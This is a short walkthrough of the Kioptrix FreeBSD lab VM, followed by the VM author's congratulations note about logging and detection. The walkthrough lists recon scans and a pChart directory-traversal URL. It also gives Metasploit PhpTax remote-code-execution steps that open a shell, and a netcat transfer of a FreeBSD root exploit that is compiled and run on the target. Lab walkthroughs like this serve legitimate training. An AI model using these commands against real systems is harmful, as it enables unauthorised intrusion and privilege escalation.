####Reconnaissance
```
netdiscover -i eth1
nmap -p1-65535 -sV -sS -T4 -A (KIOPTRIX IP)
nikto -h (KIOPTRIX IP)
dirb http://192.168.23.133
```
**searchsploit pChart
```shell
dotdotpwn -m http-url -u http://192.168.139.143/pChart2.1.3/examples/index.php?Action=View\&Script=/TRAVERSAL -k "root:" -o unix
Apply:
http://192.168.139.143/pChart2.1.3/examples/index.php?Action=View&Script=/../usr/local/etc/apache22/httpd.conf
```
**Update Firefox:
```
about:config
general.useragent.override
Mozilla/4.0 (X11; Linux x86_64; rv:10.0) Gecko/20100101 Firefox/10.0
```
**searchsploit PHPTAX
~~~msfconsole~~~
```shell
use exploit/multi/http/phptax_exec

PhpTax - 'pfilez' Execution Remote Code Injection (Metasploit) 
exploits/php/webapps/21833.rb

set LHOST (KALI IP)

set RHOST (KIOPTRIX IP)

set RPORT 8080

run

/bin/sh -i
```

**searchsploit FreeBSD 9 Privilege Escalation  
```shell
nc -nvp 4444 < /usr/share/exploitdb/platforms/freebsd/local/28718.c

cd /tmp

nc -nv (KALI IP) 4444 > priv.c

gcc priv.c 

./a.out
```
-----------------------------------------------------------------------------------------------------------------------
$ cat congrats.txt
If you are reading this, it means you got root (or cheated).
Congratulations either way...

Hope you enjoyed this new VM of mine. As always, they are made for the beginner in 
mind, and not meant for the seasoned pentester. However this does not mean one 
can't enjoy them.

As with all my VMs, besides getting "root" on the system, the goal is to also
learn the basics skills needed to compromise a system. Most importantly, in my mind,
are information gathering & research. Anyone can throw massive amounts of exploits
and "hope" it works, but think about the traffic.. the logs... Best to take it
slow, and read up on the information you gathered and hopefully craft better
more targetted attacks. 

For example, this system is FreeBSD 9. Hopefully you noticed this rather quickly.
Knowing the OS gives you any idea of what will work and what won't from the get go.
Default file locations are not the same on FreeBSD versus a Linux based distribution.
Apache logs aren't in "/var/log/apache/access.log", but in "/var/log/httpd-access.log".
It's default document root is not "/var/www/" but in "/usr/local/www/apache22/data".
Finding and knowing these little details will greatly help during an attack. Of course
my examples are specific for this target, but the theory applies to all systems.

As a small exercise, look at the logs and see how much noise you generated. Of course
the log results may not be accurate if you created a snapshot and reverted, but at least
it will give you an idea. For fun, I installed "OSSEC-HIDS" and monitored a few things.
Default settings, nothing fancy but it should've logged a few of your attacks. Look
at the following files:
/root/folderMonitor.log
/root/httpd-access.log (softlink)
/root/ossec-alerts.log (softlink)

The folderMonitor.log file is just a cheap script of mine to track created/deleted and modified
files in 2 specific folders. Since FreeBSD doesn't support "iNotify", I couldn't use OSSEC-HIDS 
for this.
The httpd-access.log is rather self-explanatory .
Lastly, the ossec-alerts.log file is OSSEC-HIDS is where it puts alerts when monitoring certain
files. This one should've detected a few of your web attacks.

Feel free to explore the system and other log files to see how noisy, or silent, you were.
And again, thank you for taking the time to download and play.
Sincerely hope you enjoyed yourself.

Be good...


loneferret
http://www.kioptrix.com
